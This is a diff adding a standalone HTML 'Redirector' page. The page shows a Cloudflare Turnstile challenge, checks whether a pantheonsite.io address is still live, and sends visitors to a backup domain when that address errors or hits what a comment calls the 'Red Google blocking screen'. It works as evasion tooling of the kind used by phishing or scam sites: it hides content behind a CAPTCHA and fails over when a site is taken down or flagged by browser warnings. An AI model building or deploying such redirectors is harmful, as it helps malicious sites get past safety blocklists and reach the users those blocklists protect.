@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirector</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <script>
+    var originalUrl = 'https://dev-eyeyr.pantheonsite.io';
+    var redirectUrl = 'https://bellshareapp.com';
+    var turnstileSiteKey = '0x4AAAAAAAjywQEz5VX18N37'; // Replace with your actual Turnstile site key
+
+    function checkTurnstile() {
+      var turnstileWidget = document.getElementById('turnstile-widget');
+      turnstileWidget.innerHTML = '';
+      var turnstileConfig = {
+        sitekey: turnstileSiteKey,
+        callback: function(token) {
+          // You can add custom logic here to handle the token
+          console.log('Turnstile token:', token);
+          checkStatus(); // Call the checkStatus function after solving the challenge
+        }
+      };
+      turnstile.render('turnstile-widget', turnstileConfig);
+    }
+
+    function checkStatus() {
+      var xhr = new XMLHttpRequest();
+      xhr.open('HEAD', originalUrl, true);
+      xhr.onload = function() {
+        if (xhr.status >= 400 && xhr.status < 600) {
+          // Error codes 404, 500, 502, 503, 504
+          window.location.href = redirectUrl; // Redirect to the redirect URL
+        } else if (xhr.status === 0) {
+          // Red Google blocking screen
+          window.location.href = redirectUrl; // Redirect to the redirect URL
+        } else {
+          // Original URL is live, do nothing
+        }
+      };
+      xhr.onerror = function() {
+        // If the request fails, redirect to the new URL
+        window.location.href = redirectUrl;
+      };
+      xhr.send();
+    }
+
+    // Run the Turnstile widget immediately
+    checkTurnstile();
+  </script>
+</head>
+<body>
+  <div id="turnstile-widget"></div>
+  <!-- You can add a loading message or a blank page here -->
+  <!--<h1>Loading...</h1>-->
+</body>
+</html>
